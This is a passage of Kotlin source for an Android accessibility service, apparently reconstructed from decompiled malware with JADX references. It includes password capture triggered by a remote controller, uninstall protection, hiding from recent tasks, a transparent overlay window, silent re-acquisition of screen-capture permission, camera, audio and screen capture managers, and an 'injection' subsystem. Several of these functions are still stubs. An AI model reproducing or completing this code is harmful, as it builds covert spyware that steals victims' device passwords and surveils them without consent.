        }
    }

    // ════════════════════════════════════════════════════════════════
    // Delegate Management
    // ════════════════════════════════════════════════════════════════

    fun registerDelegate(delegate: Any) {
        synchronized(delegateQueue) {
            if (!delegateQueue.contains(delegate)) {
                delegateQueue.add(delegate)
            }
        }
    }

    fun unregisterDelegate(delegate: Any) {
        synchronized(delegateQueue) {
            delegateQueue.remove(delegate)
        }
    }

    fun clearDelegates() {
        synchronized(delegateQueue) {
            delegateQueue.clear()
        }
    }

    fun getDelegateCount(): Int = synchronized(delegateQueue) { delegateQueue.size }

    // ════════════════════════════════════════════════════════════════
    // Internal helpers
    // ════════════════════════════════════════════════════════════════

    /**
     * Dispatch event to legacy delegate queue.
     * Eventually all delegates should use the typed AccessibilityDelegate system.
     */
    private fun dispatchToDelegates(
        event: AccessibilityEvent,
        packageName: String,
        className: String
    ) {
        synchronized(delegateQueue) {
            for (delegate in delegateQueue.toList()) {
                try {
                    if (delegate is com.storm.safe.rock.service.modules.base.AccessibilityDelegate) {
                        delegate.onAccessibilityEvent(event, packageName, className)
                    }
                    // else: untyped delegate — skip (Phase 4 will handle)
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "Delegate dispatch error: ${e.message}")
                }
            }
        }
    }

    /**
     * Ensure AppCoreService is running (throttled check).
     * JADX line 9783: check every 10s
     */
    private fun ensureCoreServiceRunning() {
        val now = System.currentTimeMillis()
        if (now - lastCoreServiceCheckTime > CORE_SERVICE_CHECK_INTERVAL) {
            lastCoreServiceCheckTime = now
            if (!AppCoreService.isRunning()) {
                try {
                    AppCoreService.start(applicationContext)
                } catch (_: Exception) {}
            }
        }
    }

    fun getCoroutineScope(): CoroutineScope? = coroutineScope

    // ════════════════════════════════════════════════════════════════
    // Stub methods for future phases
    // ════════════════════════════════════════════════════════════════

    /** Add 50x50 transparent overlay window. JADX: a0 method */
    fun addTransparentWindow() {
        // ADAPT: overlay window management depends on OverlayWindowManager initialization — deferred
        android.util.Log.d(TAG, "addTransparentWindow — OverlayWindowManager not yet wired")
    }

    /** Android 15+ silent MediaProjection recovery. JADX: a1 method */
    fun silentPermissionRecovery() {
        // ADAPT: Android 15 MediaProjection recovery depends on SmartMediaProjectionManager — deferred
        android.util.Log.d(TAG, "silentPermissionRecovery — SmartMediaProjectionManager not yet wired")
    }

    /** Start injection check job. JADX: m7 method */
    fun startInjectionCheckJob() {
        // ADAPT: periodic injection check depends on injection task queue and coroutine scheduling — deferred
        android.util.Log.d(TAG, "startInjectionCheckJob — injection subsystem not yet wired")
    }

    /** Show re-authorization notification. JADX: l9 method */
    fun showReAuthNotification() {
        // ADAPT: re-auth notification depends on NotificationManager + PendingIntent for recovery action — deferred
        android.util.Log.d(TAG, "showReAuthNotification — notification subsystem not yet wired")
    }

    /** Launch cipher capture from control. JADX: l8 method */
    fun launchCipherCaptureFromControl(overlayType: String) {
        try {
            android.util.Log.d(TAG, "🔐 控制端触发密码采集，类型: $overlayType -> 使用系统真实验证")
            launchPasswordCapture(false)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启动密码采集失败", e)
        }
    }

    /** Clean up old manager resources before reinit. JADX: h1 method */
    fun cleanupOldManagers() {
        android.util.Log.d(TAG, "🧹 开始清理旧管理器资源...")
        try { displayManager?.stopCapture() } catch (_: Exception) {}
        try { cameraManager?.release() } catch (_: Exception) {}
        try { audioManager?.release() } catch (_: Exception) {}
        // JADX line 6149: cleanup eventFilterManager, gestureRecorderManager, keyEventManager
        try { eventFilterManager = null } catch (_: Exception) {}
        try { screenCaptureManager?.stopCapture() } catch (_: Exception) {}
        android.util.Log.d(TAG, "🧹 旧管理器资源清理完成")
    }

    /** Start network initialization. JADX: part of deferred init */
    fun startNetworkInit() {
        // ADAPT: NetworkManager initialization requires server URL from SharedPreferences — deferred to MainOrchestrator
        android.util.Log.d(TAG, "startNetworkInit — deferred to MainOrchestrator initialization chain")
    }

    /** Start uninstall protection setup. JADX: part of permission flow */
    fun startUninstallProtection() {
        // JADX: delegates to enableUninstallProtection
        enableUninstallProtection()
    }

    /** Start recents guard. JADX: part of permission flow */
    fun startRecentsGuard() {
        // ADAPT: RecentsGuardManager.resume() depends on initialization — deferred
        recentsGuardManager?.let { rgm ->
            android.util.Log.d(TAG, "🎭 启动最近任务隐藏")
        } ?: android.util.Log.w(TAG, "⚠️ RecentsGuardManager 未初始化")
    }

    /** Register local service action receiver. JADX: part of deferred init */
    fun registerLocalServiceActionReceiver() {
        // ADAPT: local-service broadcast receiver depends on injection subsystem — deferred
        android.util.Log.d(TAG, "registerLocalServiceActionReceiver — deferred to injection subsystem")
    }

    /** Register network event receivers. JADX: part of deferred init */
    fun registerNetworkEventReceivers() {
        // ADAPT: network connectivity receivers depend on ConnectivityManager registration — deferred
        android.util.Log.d(TAG, "registerNetworkEventReceivers — deferred to network subsystem")
    }
}
